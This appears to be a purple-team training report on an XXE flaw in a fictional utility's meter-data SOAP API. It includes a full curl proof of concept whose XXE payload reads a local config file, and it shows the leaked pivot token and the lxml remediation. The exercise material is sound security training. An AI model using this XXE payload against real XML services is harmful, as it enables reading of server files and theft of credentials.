# Red Team Engagement Report — EXT01-M04
**Operation VAJRA SHAKTI | RNG-EXT-01 | M4-ext-meter-api**
**Engagement Type:** Purple Team Exercise | **Date:** 2025-11-15 | **Classification:** TRAINING

---

## Executive Summary
The BUNL Meter Data Exchange SOAP API parses XML with external entity resolution enabled. A crafted XXE payload reads the application config file via `file://` URI, which is reflected in the API response. The config file contains database credentials and the corporate zone pivot token.

---

## Finding 1: XML External Entity (XXE) Injection (Critical)
**CWE:** CWE-611 — Improper Restriction of XML External Entity Reference  
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) [with valid API key]  
**MITRE:** T1005

### Proof of Concept
```bash
curl -s -X POST http://203.x.x.x:8000/api/meter/submit \
  -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/bunl/meter-api/config.ini">]>
<MeterDataSubmission>
  <MeterId>&xxe;</MeterId>
  <ReadingValue>1</ReadingValue>
</MeterDataSubmission>'
```

**Response contains config.ini including:**
```ini
[pivot]
corp_pivot_token = vs-corp-7g9h2j4k6n2m
corp_zone_entry = Corporate Zone M1 — BUNL HR System (DISHA)
```

### Remediation
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```

---

## Artifacts
- `/opt/bunl/meter-api/app.py` → `parse_meter_xml()` using permissive parser
- `/opt/bunl/meter-api/config.ini` — contains pivot token
- `/var/log/bunl/meter-api/access.log` → METER_PARSED with long MeterId

---

## Pivot
**RNG-CORP-01 M1:** `vs-corp-7g9h2j4k6n2m` → Corporate Zone BUNL HR System (DISHA)
